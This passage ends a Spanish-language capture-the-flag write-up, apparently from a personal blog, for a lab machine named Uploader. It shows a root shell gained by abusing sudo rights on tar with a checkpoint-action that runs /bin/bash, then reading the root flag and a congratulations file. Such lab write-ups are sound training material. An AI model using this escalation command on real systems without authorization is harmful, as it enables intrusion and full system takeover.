+<li><a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">GTFOBins: tar</a></li>
+</ul>
+<p>Usaremos el siguiente comando:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura13.png">
+</p>
+<p>Probémoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>operatorx@TheHackersLabs-Operator:~$ sudo tar -cf /dev/null /dev/null --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --checkpoint-action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>/bin/bash
+</span></span><span style="display:flex;"><span>tar: Removing leading <span style="color:#e6db74">`</span>/<span style="color:#960050;background-color:#1e0010">&#39;</span> from member names
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Operator:/home/operatorx# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Listo, somos <strong>Root</strong>.</p>
+<p>Obtengamos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@TheHackersLabs-Operator:/home/operatorx# cd /root
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Operator:~# ls
+</span></span><span style="display:flex;"><span>Congrats.txt  root.txt
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Operator:~# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>La tenemos.</p>
+<p>Y nos dejaron un bonito mensaje:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@TheHackersLabs-Operator:~# cat Congrats.txt 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#########################################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    !FELICITACIONES!                                   #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                                                       #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    Has logrado escalar privilegios                    #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    y obtener acceso root en la maquina Uploader.      #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                                                       # </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  A seguir aprendiendo con mas maquinas y practicando. #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#########################################################</span>
+</span></span></code></pre></div><p>Con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">https://crackstation.net/</a></li><li><a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/tar/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-imagery/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Imagery - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-darkZero/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">DarkZero - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
